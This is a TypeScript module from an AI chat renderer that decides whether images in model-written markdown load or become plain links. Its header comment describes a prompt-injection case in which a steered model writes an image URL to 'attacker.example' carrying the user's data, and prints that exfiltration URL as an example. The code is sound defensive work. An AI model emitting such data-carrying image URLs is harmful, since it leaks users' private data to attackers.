/**
 * Which images in model-written markdown may load (SPEC §6.4 item 3, gap-web W4).
 *
 * A markdown image is a GET the reader's browser sends the moment the answer
 * renders, with no click. A model steered by a page it read can write
 * `![](https://attacker.example/p.png?d=<the user's data>)`, and the data
 * leaves before anyone reads a word. The CSP allows remote images (the canvas
 * and shared pages need them), so the rule lives at the renderer: a remote
 * image loads only when its URL is one the turn already had a reason to show —
 * the message's sources, its tool records' pages and results, its attachments —
 * or it is Juno's own. Anything else becomes a link the reader can choose to
 * open, which sends nothing until they do.
 *
 * Pure and client-safe; `markdown.tsx` applies it when a caller passes
 * `allowedImageUrls`, and an absent set keeps today's behaviour everywhere else.
 */

import { canonicalize, canonKey } from "@/lib/web/url-canon";

export type ImageDecision =
  | { kind: "render" }
  /** Load nothing; offer the link instead. `host` is what the chip names. */
  | { kind: "link"; href: string; host: string }
  | { kind: "drop" };

/** The canonical keys of the allowed URLs, for exact comparison. */
export function allowedImageKeys(urls: Iterable<string>): Set<string> {
  const keys = new Set<string>();
  for (const url of urls) {
    const canon = canonicalize(url, { bareDomain: false });
    if (canon) keys.add(canonKey(canon));
  }
  return keys;
}

const PLACEHOLDER_BASE = "https://juno-image-base.invalid";

/**
 * What to do with one image `src`. `pageOrigin` is Juno's own origin, or null
 * when it is not known; a relative `src` is same-origin either way. Callers
 * pass a value that is the same on the server and in the browser, so both
 * renders decide alike.
 */
export function imageDecision(
  src: string | null | undefined,
  allowedKeys: ReadonlySet<string>,
  pageOrigin: string | null,
): ImageDecision {
  const raw = (src ?? "").trim();
  if (!raw) return { kind: "drop" };
  if (/^data:image\//i.test(raw)) return { kind: "render" };
  if (/^blob:/i.test(raw)) return { kind: "render" };

  const hasScheme = /^[a-z][a-z0-9+.-]*:/i.test(raw);
  // A relative path is Juno's own; a protocol-relative one (`//host/x`) is not.
  if (!hasScheme && !raw.startsWith("//")) return { kind: "render" };

  let url: URL;
  try {
    url = new URL(raw, pageOrigin ?? PLACEHOLDER_BASE);
  } catch {
    return { kind: "drop" };
  }
  if (url.protocol !== "http:" && url.protocol !== "https:") return { kind: "drop" };
  if (pageOrigin && url.origin === pageOrigin) return { kind: "render" };

  const canon = canonicalize(url.toString(), { bareDomain: false });
  if (canon && allowedKeys.has(canonKey(canon))) return { kind: "render" };
  return { kind: "link", href: url.toString(), host: url.hostname.replace(/^www\./, "") };
}
